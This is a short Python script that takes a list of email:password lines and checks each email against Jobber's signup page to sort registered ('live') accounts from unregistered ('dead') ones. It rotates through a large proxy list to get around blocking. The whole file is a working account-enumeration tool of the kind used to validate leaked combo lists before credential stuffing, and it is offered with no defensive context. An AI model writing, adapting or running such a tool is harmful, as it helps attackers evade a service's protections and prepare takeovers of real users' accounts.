import requests
from random import randint

def salah(email):
	print("{} dead".format(email))
	d= open("dead.txt","a")
	d.write("{} \n".format(email))
	d.close()
def bener(email,namafile):
	print("{} live".format(email))
	f= open(namafile,"a")
	f.write("{} \n".format(email))
	f.close()
def check(email,namafile):
	em=email[0]
	success_keyword = "already"
	gakkenek="blocked"
	api_sender=requests.session()
	while True :
		prox=open("proxy","r")
		line=randint(0,4241)
		prox=prox.readlines()
		prox=[lines.replace("\n","")for lines in prox]
		prof=prox[line]		
		# print(prof)
		proxies= {
		 "https" : "https://{}".format(prof)
		}
		# print(proxies)
		try:
			# print("abc")
			source=api_sender.get(url="https://secure.getjobber.com/signup",params={"email":em},proxies=proxies,timeout=5).text
			# print("bca")
			if success_keyword in source:
				# print("checking")
				bener(em,namafile)
				break
			elif gakkenek in source:
				pass
			else:
				salah(em)
				break
		except :
			pass
	# print(source)	
	
	
		# print("Asw")
	l= open("last.txt ","w+")
	l.write(" Last Checked : {}".format(email))
	l.close()



filenya = input("Masukan List mail anda :")
namafile = input("Simpan Hasil di :")
filenya = open(filenya,"r").readlines()
filenya = [lines.replace("\n","")for lines in filenya]
filenya = [lines.replace(" ","")for lines in filenya]
for lines in filenya :
    email = lines.split(":")
    check(email,namafile)
l= open("last.txt","a")
l.write("last cheked end :{} \n".format(email))
l.close()
